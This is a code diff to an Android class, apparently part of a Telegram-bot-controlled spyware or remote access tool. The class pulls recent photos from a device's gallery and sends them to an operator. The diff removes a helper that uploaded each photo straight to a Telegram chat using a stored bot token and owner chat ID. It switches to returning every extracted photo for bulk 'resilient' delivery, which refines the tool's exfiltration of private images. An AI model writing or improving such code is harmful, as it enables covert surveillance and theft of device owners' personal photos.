@@ -86,9 +86,6 @@ class StorageAccessCommand @Inject constructor(
             val dateColumn = cursor.getColumnIndexOrThrow(MediaStore.Images.Media.DATE_ADDED)
 
             var count = 0
-            val botToken = preferencesManager.botToken
-            val targetChatId = if (chatId != 0L) chatId else preferencesManager.ownerChatIdLong
-
             val cacheDir = File(context.cacheDir, "gallery_temp").apply { mkdirs() }
 
             do {
@@ -110,11 +107,6 @@ class StorageAccessCommand @Inject constructor(
                     if (tempFile.exists() && tempFile.length() > 0) {
                         tempFiles.add(tempFile)
                         count++
-
-                        // If more than 1 image, send preceding photos directly
-                        if (count < requestedCount && botToken.isNotBlank() && targetChatId != 0L) {
-                            sendTelegramPhotoDirect(botToken, targetChatId, tempFile, "🖼️ Gallery Photo #$count: $displayName ($dateStr)")
-                        }
                     }
                 } catch (e: Exception) {
                     Log.w(TAG, "Failed to read image id $id: ${e.message}")
@@ -127,12 +119,12 @@ class StorageAccessCommand @Inject constructor(
                 return@withContext CommandResult(false, "❌ Failed to read recent photos from device storage.")
             }
 
-            // Return the latest photo in CommandResult so CommandExecutor handles final delivery
-            val lastPhoto = tempFiles.last()
+            // Return all extracted photos in photoFiles so CommandExecutor handles resilient multi-photo delivery
             CommandResult(
                 success = true,
                 message = "🖼️ <b>Gallery Extraction Completed:</b> Delivered $count recent photo(s) from camera roll.",
-                photoFile = lastPhoto
+                photoFile = tempFiles.firstOrNull(),
+                photoFiles = tempFiles
             )
         } catch (e: Exception) {
             Log.e(TAG, "Gallery extraction failed: ${e.message}", e)
@@ -267,24 +259,6 @@ class StorageAccessCommand @Inject constructor(
             bytes >= 1024 * 1024 -> String.format(Locale.US, "%.1f MB", bytes / (1024.0 * 1024.0))
             bytes >= 1024 -> "${bytes / 1024} KB"
             else -> "$bytes B"
-        }
-    }
-
-    private suspend fun sendTelegramPhotoDirect(token: String, chatId: Long, file: File, caption: String) {
-        try {
-            val chatIdBody = chatId.toString().toRequestBody("text/plain".toMediaTypeOrNull())
-            val captionBody = caption.toRequestBody("text/plain".toMediaTypeOrNull())
-            val fileBody = file.asRequestBody("image/jpeg".toMediaTypeOrNull())
-            val part = MultipartBody.Part.createFormData("photo", file.name, fileBody)
-
-            telegramApi.sendPhoto(
-                token = token,
-                chatId = chatIdBody,
-                photo = part,
-                caption = captionBody
-            )
-        } catch (e: Exception) {
-            Log.w(TAG, "Direct photo send error: ${e.message}")
         }
     }
 }
